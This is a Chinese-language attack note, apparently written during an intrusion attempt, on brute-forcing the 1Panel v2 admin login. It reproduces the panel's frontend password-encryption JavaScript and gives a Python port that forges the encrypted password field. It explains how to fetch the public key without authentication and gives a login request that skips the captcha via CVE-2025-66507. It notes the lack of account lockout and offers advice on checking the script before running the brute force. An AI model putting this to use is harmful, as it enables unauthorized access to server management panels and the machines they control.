## 原始前端实现（1Panel v2，从无认证可下载的 /assets/js/index-*.js 提取）

```js
function U7e(e){const a=`; ${document.cookie}`.split(`; ${e}=`);if(a.length===2)return a.pop().split(";").shift()}
function q7e(e,t){if(!e)return e;const a=new Pye;return a.setPublicKey(t),a.encrypt(e)}      // JSEncrypt → PKCS1v15 + base64
function W7e(e,t){const a=Tc.enc.Utf8.parse(t),n=Tc.lib.WordArray.random(16),
  r=Tc.AES.encrypt(e,a,{iv:n,mode:Tc.mode.CBC,padding:Tc.pad.Pkcs7});
  return n.toString(Tc.enc.Base64)+":"+r.toString()}
function j7e(e){return decodeURIComponent(e.replace(/\+/g," "))}
function K7e(){const t=new Uint8Array(16);return crypto.getRandomValues(t),
  Array.from(t).map(a=>a.toString(16).padStart(2,"0")).join("")}
const Rrt=e=>{ if(!e)return""; let t=U7e("panel_public_key"); if(!t)return e; t=j7e(t);
  const a=K7e(); t=t.replaceAll('"',"");
  const n=atob(t), r=q7e(a,n), o=W7e(e,a);
  return `${r}:${o}` }        // 最终提交给 password 字段
```

要点：`a` 是 **32 个 hex 字符**（16 随机字节 → hex），当字符串直接 UTF-8 后作 **AES-256 密钥**（不是 hex 解码后用 16 字节）。

## Python 等价实现

```python
import base64, os, secrets, urllib.parse
from cryptography.hazmat.primitives import padding as sympadding, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asympadding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def make_password_field(pw: str, pub) -> str:
    """pw=明文口令, pub=PEM 公钥 (serialization.load_pem_public_key)"""
    if not pw:
        return ""
    key_hex = secrets.token_hex(16)                      # 32 hex chars → AES-256 key
    rsa_part = base64.b64encode(
        pub.encrypt(key_hex.encode(), asympadding.PKCS1v15())).decode()
    iv = os.urandom(16)
    p = sympadding.PKCS7(128).padder()
    data = p.update(pw.encode("utf-8")) + p.finalize()
    ctx = Cipher(algorithms.AES(key_hex.encode()), modes.CBC(iv)).encryptor()
    ct = ctx.update(data) + ctx.finalize()
    return f"{rsa_part}:{base64.b64encode(iv).decode()}:{base64.b64encode(ct).decode()}"
```

取公钥：任意未认证可达接口（如 `GET /api/v1/dashboard/base/os`）响应 Set-Cookie 的 `panel_public_key`（值 = base64 的 PEM，URL 编码；需 `unquote` 后去掉多余引号，必要时补 `=` 填充再做 base64 解码）。

## 登录请求

```http
POST /api/v1/auth/login HTTP/1.1
Host: <TARGET>:9527
Content-Type: application/json

{"name":"1panel","password":"<rsa_b64>:<iv_b64>:<ct_b64>","ignoreCaptcha":true,"captcha":"","captchaID":"","authMethod":"session","language":"zh"}
```

- `ignoreCaptcha: true` = CVE-2025-66507（< 2.0.14 跳过验证码校验），且这是前端表单默认值。
- 无账号锁定，可长时间在线尝试。

## 判定与陷阱

- 失败统一返回 `{"code":406,"message":"ErrAuth"}` —— **无法用响应区分「解密失败」与「口令不匹配」**，所以"跑了几百次全是 ErrAuth 说明脚本可用"是错误推论（这正是 90 次无效尝试未被察觉的原因）。
- 空口令返回 `{"code":400,"message":"参数错误: Key: 'Login.Password' ..."}` —— 可用来确认服务端确实在校验该字段。
- **必须先用前端 chunk 核对加密格式**，再投入爆破；格式错的脚本永远爆不出东西。